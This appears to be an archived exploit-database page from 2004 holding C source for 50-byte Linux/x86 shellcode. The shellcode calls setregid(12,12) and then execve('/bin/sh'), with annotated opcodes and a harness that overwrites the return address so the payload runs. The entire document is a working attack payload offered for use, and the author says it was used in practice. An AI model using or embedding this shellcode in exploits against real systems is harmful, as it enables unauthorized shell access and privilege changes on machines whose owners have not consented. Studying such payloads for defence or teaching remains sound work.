<html><head><title>linux/x86 execve /bin/sh setreuid(12,12) 50 bytes</title></head><pre>/*
 *  Linux/x86
 *  An example of setregid(), execve() /bin/sh
 *
 *  (I used this in practise, hence the setregid(12, 12);)
 */

#include &lt;stdio.h&gt;

char c0de[] = 
/* main: */                            /* setregid(12, 12);        */
&quot;\x29\xc0&quot;                             /* subl %eax, %eax          */
&quot;\xb0\x47&quot;                             /* movb $71, %al            */
&quot;\x29\xdb&quot;                             /* subl %ebx, %ebx          */

/*
 *  Here's the GID for the setregid() call. Change to suit.
 */
&quot;\xb3\x0c&quot;                             /* movb $12, %bl            */
&quot;\x89\xd9&quot;                             /* movl %ebx, %ecx          */

&quot;\xcd\x80&quot;                             /* int $0x80                */
&quot;\xeb\x18&quot;                             /* jmp callz                */

/* start: */ /* execve of /bin/sh */
&quot;\x5e&quot;                                 /* popl %esi                */
&quot;\x29\xc0&quot;                             /* subl %eax, %eax          */
&quot;\x88\x46\x07&quot;                         /* movb %al, 0x07(%esi)     */
&quot;\x89\x46\x0c&quot;                         /* movl %eax, 0x0c(%esi)    */
&quot;\x89\x76\x08&quot;                         /* movl %esi, 0x08(%esi)    */
&quot;\xb0\x0b&quot;                             /* movb $0x0b, %al          */
&quot;\x87\xf3&quot;                             /* xchgl %esi, %ebx         */
&quot;\x8d\x4b\x08&quot;                         /* leal 0x08(%ebx), %ecx    */
&quot;\x8d\x53\x0c&quot;                         /* leal 0x0c(%ebx), %edx    */
&quot;\xcd\x80&quot;                             /* int $0x80                */

/* callz: */
&quot;\xe8\xe3\xff\xff\xff&quot;                 /* call start               */

/* /bin/sh */
&quot;\x2f\x62\x69\x6e\x2f\x73\x68&quot;;

main() {
        int *ret;
        ret=(int *)&amp;ret +2;
        printf(&quot;Shellcode lenght=%d\n&quot;,strlen(c0de));
        (*ret) = (int)c0de;
}

// milw0rm.com [2004-09-12]</pre></html>